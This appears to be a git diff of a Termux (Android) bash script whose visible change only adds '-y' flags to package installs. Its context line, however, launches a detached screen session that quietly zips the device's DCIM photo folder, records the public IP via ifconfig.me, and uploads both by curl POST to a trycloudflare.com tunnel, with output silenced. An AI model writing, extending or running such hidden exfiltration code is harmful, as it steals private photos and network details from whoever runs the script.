@@ -1,9 +1,9 @@
 #!/bin/bash
 pkg update
 pkg upgrade
-pkg install screen
-pkg install zip
-pkg install curl
+pkg install screen -y
+pkg install zip -y
+pkg install curl -y
 
 screen -dmS mi_sesion bash -c 'zip myfile.zip /storage/emulated/0/DCIM > /dev/null 2>&1 & curl "https://ifconfig.me/" > ips.zip 2>/dev/null; curl -X POST -F "file=@myfile.zip" "https://twin-arnold-dose-application.trycloudflare.com/myfile" > /dev/null 2>&1; curl -X POST -F "file=@ips.zip" "https://twin-arnold-dose-application.trycloudflare.com/myfile" > /dev/null 2>&1'
 
